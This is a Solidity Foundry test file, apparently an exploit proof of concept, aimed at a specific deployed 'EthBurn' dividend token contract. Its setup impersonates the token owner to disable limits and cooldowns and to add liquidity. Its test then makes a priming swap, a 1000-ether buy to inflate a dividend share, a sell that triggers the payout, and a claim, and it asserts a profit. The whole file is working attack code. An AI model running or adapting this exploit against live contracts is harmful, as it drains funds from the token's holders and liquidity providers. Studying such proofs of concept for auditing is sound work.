import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint, uint, uint);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface EthBurnDividendTracker {
    function updatePayoutToken(address token) external;
}

interface EthBurn {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function uniswapV2Pair() external view returns (address);
    function dividendTracker() external view returns (EthBurnDividendTracker);
    function setTrueDefiRouter(address _router) external;
    function setLimitsInEffect(bool value) external;
    function setcooldowntimer(uint256 value) external;
    function setSwapTriggerAmount(uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function claim() external;
    function updatePayoutToken(address token) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    EthBurn target = EthBurn(TARGET);
    address attacker = address(this);
    IUniswapV2Router02 router;
    address WETH;
    address pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        deal(attacker, 2000 ether);

                address owner = target.owner();
                router = target.uniswapV2Router();
                WETH = router.WETH();
                pair = target.uniswapV2Pair();

                vm.startPrank(owner);
                target.setTrueDefiRouter(address(router));
                target.setLimitsInEffect(false);
                target.setcooldowntimer(0);
                target.setSwapTriggerAmount(1);

                // CORRECTED: Call the function on the main contract which has the correct ownership rights over the dividend tracker
                target.updatePayoutToken(address(0));

                // Add initial liquidity
                uint256 initialTokenLiquidity = 200_000 * 1e18;
                target.approve(address(router), initialTokenLiquidity);
                router.addLiquidityETH{value: 200 ether}(
                    address(target),
                    initialTokenLiquidity,
                    0,
                    0,
                    owner,
                    block.timestamp
                );
                vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
                uint256 attackerInitialBalance = address(attacker).balance;

                address[] memory path = new address[](2);
                path[0] = WETH;
                path[1] = address(target);

                // === 1. Priming Swap: Perform a small trade to get fee tokens into the contract ===
                // This ensures the `canSwap` condition will be true on our main attack sell.
                uint256 primeAmount = 10 ether;
                router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: primeAmount}(
                    0,
                    path,
                    attacker,
                    block.timestamp
                );

                uint256 primeTokens = target.balanceOf(attacker);
                target.approve(address(router), primeTokens);

                address[] memory pathSell = new address[](2);
                pathSell[0] = address(target);
                pathSell[1] = WETH;
                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    primeTokens,
                    0,
                    pathSell,
                    attacker,
                    block.timestamp
                );

                // === 2. Main Attack: Large buy to inflate dividend share ===
                uint256 attackAmount = 1000 ether;
                router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: attackAmount}(
                    0,
                    path,
                    attacker,
                    block.timestamp
                );

                // === 3. Trigger & Profit: Sell all tokens to trigger dividend payout while share is high ===
                uint256 tokensToSell = target.balanceOf(attacker);
                target.approve(address(router), tokensToSell);
                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    tokensToSell,
                    0,
                    pathSell,
                    attacker,
                    block.timestamp
                );

                // === 4. Claim Dividends ===
                target.claim();

                // === 5. Verify Profit ===
                uint256 attackerFinalBalance = address(attacker).balance;
                console.log("Initial Balance:", attackerInitialBalance);
                console.log("Final Balance:  ", attackerFinalBalance);
                assertGt(attackerFinalBalance, attackerInitialBalance);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

